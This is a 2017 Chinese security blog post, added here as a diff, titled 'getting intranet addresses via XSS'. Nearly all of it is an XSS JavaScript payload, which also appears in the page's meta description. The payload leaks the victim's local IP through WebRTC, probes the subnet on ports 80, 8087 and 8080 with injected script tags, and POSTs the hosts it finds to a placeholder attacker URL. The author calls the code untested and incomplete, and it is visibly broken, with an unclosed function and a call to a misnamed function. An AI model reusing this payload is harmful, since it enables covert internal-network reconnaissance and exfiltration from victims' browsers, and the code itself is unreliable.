@@ -1,0 +1,419 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>XSS获取内网地址 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="http://cb.drops.wiki/bugs/wooyun-2014-076685.html 
+代码未测试
+var RTCPeerConnection &amp;#x3D; window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+if (RTCPeerConnection) (function()&amp;#123;
+	var rtc &amp;#x3D; new RTCPeerConnection(&amp;#123;iceServers:[]&amp;#125;);
+	if (window.mozRTCPeerConnection)&amp;#123;
+		rtc.createDataChannel(&amp;#39;&amp;#39;,&amp;#123;reliable:false&amp;#125;);
+	&amp;#125;;
+	rtc.onicecandidate &amp;#x3D; function(evt)&amp;#123;
+		if (evt.candidate) grepSDP(evt.candidate.candidate);
+	&amp;#125;;
+	rtc.createOffer(function(offerDesc)&amp;#123;
+		grepSDP(offerDesc.sdp);
+		rtc.setLocalDescription(offerDesc);
+	&amp;#125;,function(e)&amp;#123;console.warn(&amp;quot;offer failed&amp;quot;, e);&amp;#125;);
+	var addrs &amp;#x3D; Object.create(null);
+	addrs[&amp;quot;0.0.0.0&amp;quot;] &amp;#x3D; false;
+	function updateDisplay(newAddr)&amp;#123;
+		if(newAddr in addrs) return;
+		else addrs[newAddr] &amp;#x3D; true;
+		var displayAddrs &amp;#x3D; Object.keys(addrs).filter(function(k)&amp;#123;return addrs[k];&amp;#125;);
+		var address &amp;#x3D; displayAddrs.join(&amp;quot;or perhaps&amp;quot;) || &amp;quot;n&amp;#x2F;a&amp;quot;;
+		sendip(address);
+	&amp;#125;
+	function grepSDP(sdp)&amp;#123;
+		var hosts &amp;#x3D; [];
+		sdp.split(&amp;#39;\r\n&amp;#39;).forEach(function(line)&amp;#123;
+			if(~line.indexOf(&amp;quot;a&amp;#x3D;candidate&amp;quot;))&amp;#123;
+				var parts &amp;#x3D; line.split(&amp;#39; &amp;#39;),
+				addr &amp;#x3D; parts[4],
+				type &amp;#x3D; parts[7];
+				if(type &amp;#x3D;&amp;#x3D;&amp;#x3D; &amp;#39;host&amp;#39;) updateDisplay(addr);
+			&amp;#125;else if(~line.indexOf(&amp;quot;c&amp;#x3D;&amp;quot;))&amp;#123;
+				var parts &amp;#x3D; line.split(&amp;#39; &amp;#39;),
+				addr &amp;#x3D; parts[2];
+				updateDisplay(addr);
+			&amp;#125;
+		&amp;#125;);
+	&amp;#125;
+&amp;#125;)();
+function sendip(ipaddress)&amp;#123;
+	var url &amp;#x3D; &amp;quot;xxxxx&amp;quot;;
+&amp;#125;
+
+＝＝＝＝代码貌似不全＝＝＝＝
+
+function ipsend(ip, netport)&amp;#123;
+	var ipdata &amp;#x3D; ip+&amp;quot;:&amp;quot;+netport;
+	var url &amp;#x3D; &amp;quot;x.x.x.x&amp;quot;;
+	var xmlhttp1 &amp;#x3D; new XMLHttpRequest();
+	xmlhttp1.open(&amp;quot;POST&amp;quot;,url,true);
+	xmlhttp1.setRequestHeader(&amp;quot;Content-Type&amp;quot;,&amp;quot;application&amp;#x2F;x-www-form-urlencoded&amp;quot;);
+	xmlhttp1.send(&amp;quot;ip&amp;#x3D;&amp;#x3D;&amp;lt;!--start--&amp;gt;&amp;quot; + ipdata);
+
+function ipCreate(ip)&amp;#123;
+	var ips &amp;#x3D; ip.replace(&amp;#x2F;(\d+\.\d+\.\d+)\.\d+&amp;#x2F;,&amp;#39;$1.&amp;#39;);
+	for(var i&amp;#x3D;1;i&amp;lt;&amp;#x3D;255;i++)&amp;#123;
+		ElementCreate(ips+i,&amp;quot;80&amp;quot;,i);
+		ElementCreate(ips+i,&amp;quot;8087&amp;quot;,i);
+		ElementCreate(ips+i,&amp;quot;8080&amp;quot;,i);
+	&amp;#125;
+&amp;#125;
+function ElementCreate(ip,xport,i)&amp;#123;
+	var url &amp;#x3D; &amp;quot;http:&amp;#x2F;&amp;#x2F;&amp;quot;+ip+&amp;quot;:&amp;quot;+xport;
+	var scriptElement &amp;#x3D; document.createElement(&amp;quot;script&amp;quot;);
+	scriptElement.src &amp;#x3D; url;
+	scriptElement.setAttribute(&amp;quot;onload&amp;quot;,&amp;quot;ipsend(\&amp;#39;&amp;quot;+ip+&amp;quot;\&amp;#39;,\&amp;#39;&amp;quot;+xport+&amp;quot;\&amp;#39;)&amp;quot;);
+	document.body.appendChild(scriptElement);
+&amp;#125;
+ipcreate(&amp;quot;10.10.125.195&amp;quot;);
+&amp;#125;
+
+&amp;#x3D;＝＝＝＝代码貌似不全＝＝＝＝"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="XSS获取内网地址"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> XSS获取内网地址</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="http://cb.drops.wiki/bugs/wooyun-2014-076685.html">http://cb.drops.wiki/bugs/wooyun-2014-076685.html</a> </p>
+<p>代码未测试</p>
+<pre class="line-numbers language-none"><code class="language-none">var RTCPeerConnection &#x3D; window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+if (RTCPeerConnection) (function()&#123;
+	var rtc &#x3D; new RTCPeerConnection(&#123;iceServers:[]&#125;);
+	if (window.mozRTCPeerConnection)&#123;
+		rtc.createDataChannel(&#39;&#39;,&#123;reliable:false&#125;);
+	&#125;;
+	rtc.onicecandidate &#x3D; function(evt)&#123;
+		if (evt.candidate) grepSDP(evt.candidate.candidate);
+	&#125;;
+	rtc.createOffer(function(offerDesc)&#123;
+		grepSDP(offerDesc.sdp);
+		rtc.setLocalDescription(offerDesc);
+	&#125;,function(e)&#123;console.warn(&quot;offer failed&quot;, e);&#125;);
+	var addrs &#x3D; Object.create(null);
+	addrs[&quot;0.0.0.0&quot;] &#x3D; false;
+	function updateDisplay(newAddr)&#123;
+		if(newAddr in addrs) return;
+		else addrs[newAddr] &#x3D; true;
+		var displayAddrs &#x3D; Object.keys(addrs).filter(function(k)&#123;return addrs[k];&#125;);
+		var address &#x3D; displayAddrs.join(&quot;or perhaps&quot;) || &quot;n&#x2F;a&quot;;
+		sendip(address);
+	&#125;
+	function grepSDP(sdp)&#123;
+		var hosts &#x3D; [];
+		sdp.split(&#39;\r\n&#39;).forEach(function(line)&#123;
+			if(~line.indexOf(&quot;a&#x3D;candidate&quot;))&#123;
+				var parts &#x3D; line.split(&#39; &#39;),
+				addr &#x3D; parts[4],
+				type &#x3D; parts[7];
+				if(type &#x3D;&#x3D;&#x3D; &#39;host&#39;) updateDisplay(addr);
+			&#125;else if(~line.indexOf(&quot;c&#x3D;&quot;))&#123;
+				var parts &#x3D; line.split(&#39; &#39;),
+				addr &#x3D; parts[2];
+				updateDisplay(addr);
+			&#125;
+		&#125;);
+	&#125;
+&#125;)();
+function sendip(ipaddress)&#123;
+	var url &#x3D; &quot;xxxxx&quot;;
+&#125;
+
+＝＝＝＝代码貌似不全＝＝＝＝
+
+function ipsend(ip, netport)&#123;
+	var ipdata &#x3D; ip+&quot;:&quot;+netport;
+	var url &#x3D; &quot;x.x.x.x&quot;;
+	var xmlhttp1 &#x3D; new XMLHttpRequest();
+	xmlhttp1.open(&quot;POST&quot;,url,true);
+	xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);
+	xmlhttp1.send(&quot;ip&#x3D;&#x3D;&lt;!--start--&gt;&quot; + ipdata);
+
+function ipCreate(ip)&#123;
+	var ips &#x3D; ip.replace(&#x2F;(\d+\.\d+\.\d+)\.\d+&#x2F;,&#39;$1.&#39;);
+	for(var i&#x3D;1;i&lt;&#x3D;255;i++)&#123;
+		ElementCreate(ips+i,&quot;80&quot;,i);
+		ElementCreate(ips+i,&quot;8087&quot;,i);
+		ElementCreate(ips+i,&quot;8080&quot;,i);
+	&#125;
+&#125;
+function ElementCreate(ip,xport,i)&#123;
+	var url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+xport;
+	var scriptElement &#x3D; document.createElement(&quot;script&quot;);
+	scriptElement.src &#x3D; url;
+	scriptElement.setAttribute(&quot;onload&quot;,&quot;ipsend(\&#39;&quot;+ip+&quot;\&#39;,\&#39;&quot;+xport+&quot;\&#39;)&quot;);
+	document.body.appendChild(scriptElement);
+&#125;
+ipcreate(&quot;10.10.125.195&quot;);
+&#125;
+
+&#x3D;＝＝＝＝代码貌似不全＝＝＝＝
+
+
+
+
+
+
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2017/05/23/xss-get-ip.html" class="leancloud-visitors view" data-flag-title="XSS获取内网地址">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2017/05/24/schtasks定时后门.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2017/05/19/baopo-Q.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-05-23 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Fun/">Fun<span>3</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
